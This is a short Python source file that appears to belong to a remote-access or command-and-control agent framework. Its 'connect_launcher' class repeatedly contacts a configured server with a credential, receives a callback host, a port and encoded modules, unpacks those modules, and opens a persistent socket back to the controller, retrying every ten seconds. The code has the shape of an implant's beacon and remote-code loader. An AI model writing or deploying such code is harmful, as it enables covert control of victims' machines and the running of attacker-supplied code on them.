from network.launcher.base_launcher import base_launcher
from network.ksocket import Ksocket
from network.khttp import Khttp
from utils.configuration import Kconfig
from module.factory_module import Kmodules
import argparse, time, traceback

class connect_launcher(base_launcher):
	"connect_launcher"
	def __init__(self):
		self.socket = None
		
	def start(self):
		while True:
			try:
				###For debug
				if Kconfig().debug:
					host, port = Kconfig().server.split(":")
				else:
					host, port, en_mods = Khttp().get_connection(Kconfig().server_url, Kconfig().credential)
					Kmodules().unpacker(en_mods)
					
					print("return {} {}".format(host, port))

				self.socket = Ksocket(host, port, Kconfig().credential)
				
				self.socket.start()
				self.socket.loop()
				
			except Exception as e:
				traceback.print_exc()

			if self.socket:
				self.socket.close()
				self.socket = None

			time.sleep(10)